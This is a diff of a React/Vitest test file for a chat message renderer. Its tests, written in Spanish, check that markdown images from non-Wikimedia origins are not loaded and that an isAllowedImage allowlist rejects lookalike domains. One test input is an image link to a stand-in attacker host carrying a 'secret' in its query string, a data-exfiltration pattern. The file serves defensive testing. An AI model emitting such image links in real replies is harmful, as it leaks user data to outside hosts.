@@ -1,6 +1,6 @@
 import { describe, it, expect, afterEach } from "vitest"
 import { render, cleanup, act } from "@testing-library/react"
-import { MathText, MessageContent } from "./message-content"
+import { MathText, MessageContent, isAllowedImage } from "./message-content"
 
 afterEach(cleanup)
 
@@ -15,6 +15,22 @@ async function renderMath(ui: React.ReactElement) {
 }
 
 describe("MessageContent", () => {
+  it("una imagen de otro origen no se carga: queda su texto alternativo", () => {
+    const { container } = render(
+      <MessageContent content={"Mira:\n\n![resumen](https://evil.example/p.png?d=secreto)\n\n![x](https://upload.wikimedia.org.evil.example/a.png)"} />,
+    )
+    expect(container.querySelector("img")).toBeNull()
+    expect(container.textContent).toContain("[Imagen: resumen]")
+  })
+
+  it("solo valen los orígenes de Wikimedia, con su barra final", () => {
+    expect(isAllowedImage("https://upload.wikimedia.org/wikipedia/commons/a.jpg")).toBe(true)
+    expect(isAllowedImage("https://thumb.wikimedia.org/v.jpg")).toBe(true)
+    expect(isAllowedImage("http://upload.wikimedia.org/a.jpg")).toBe(false)
+    expect(isAllowedImage("https://upload.wikimedia.org.evil.example/a.jpg")).toBe(false)
+    expect(isAllowedImage(undefined)).toBe(false)
+  })
+
   it("pinta la foto de Wikimedia que manda el backend, ajustada al ancho y sin enviar referer", () => {
     const { container } = render(
       <MessageContent content={"Así es un volcán:\n\n![Volcán Villarrica](https://thumb.wikimedia.org/v.jpg)\n*Foto: Ana · CC BY-SA 4.0 · Wikimedia Commons*"} />,
